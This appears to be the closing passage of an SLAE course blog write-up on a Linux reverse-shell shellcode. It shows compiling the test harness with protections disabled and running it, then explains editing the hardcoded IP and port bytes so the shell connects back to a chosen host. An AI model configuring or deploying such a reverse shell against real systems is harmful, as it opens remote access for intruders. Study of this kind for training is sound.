Compile the shellcode.c and run it:
{% highlight js %}
kali@kali:~/Desktop/SLAE-Assignments/assignment2$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
kali@kali:~/Desktop/SLAE-Assignments/assignment2$ ./shellcode 
Shellcode Length:  89
{% endhighlight %}

![reverse-shellcode](https://bohansec.com/assets/reverse-shellcode.png "reverse-shellcode")

![confirm3](https://bohansec.com/assets/confirm3.png "confirm3")

### Step8 - Configure the IP and port number

Edit the "\xc0\xa8\xc8\x88" to your desired IP. Convert the IP address into hex at [here](https://www.browserling.com/tools/ip-to-hex){:target="_blank"}. Edit the "\x11\x5c" to your desired port number. Convert the port number into hex at [here](https://www.rapidtables.com/convert/number/decimal-to-hex.html){:target="_blank"}.

You can find all the above code at [here](https://github.com/allan9595/SLAE-Assignments/tree/master/assignment2){:target="_blank"}.

Thanks for reading :)

	

